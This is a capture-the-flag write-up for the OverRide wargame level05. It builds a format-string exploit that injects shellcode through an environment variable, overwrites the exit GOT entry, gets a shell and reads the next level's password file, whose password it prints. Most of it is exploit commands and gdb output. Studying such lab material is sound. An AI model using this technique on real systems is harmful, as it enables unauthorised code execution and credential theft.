# level05

On the [gdb writeup](Ressources/gdbwriteup.md), we found that there is an exit at the end of the program and that we're writing on the 10th stack argument

So we will try to override the exit function with the address of the function that we want to execute, which is our shellcode

```bash 
level05@OverRide:~$ export SHELLCODE=$(python -c "print '\x90' * 20 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
```

So we will try to produce an exploit:
```bash
python -c "print('\x80\x49\x7\xe0'[::-1] + '%4294957231x$10')" | ./level05
```
Not working, we will need to split the address in two parts

```bash
python -c "print('\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] +  '%<1st decimal value>x%10\$n' + '%<2nd decimal value>x%11\$n')" | ./level05
```

To understand how to calculate the decimal values there is different steps

- First, we will find the address of our shellcode 
```asm
level05@OverRide:~$ gdb ./level05 -q
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) r
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048449 in main ()
(gdb) x/200x $esp
0xffffd8a0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8b0:     0xdb31c031      0x80cd06b0      0x742f6853      0x2f687974
```

We can see that the address of our shellcode is 0xffffd8b0

- Then, we will split the address in two parts
```asm
(gdb) print 0xd8b0
$2 = 55472
(gdb) print 0xd8b0 - 8
$3 = 55464
(gdb) print 0xffff
$4 = 65535
(gdb) print 0xffff - (0xd8b0 - 8) - 8
$5 = 10063
```

So our first decimal value will be 55464 and our second decimal value will be 10063

```bash
python -c "print('\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] +  '%55464x%10\$n' + '%10063x%11\$n')" | ./level05

$ whoami
level06
$ cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

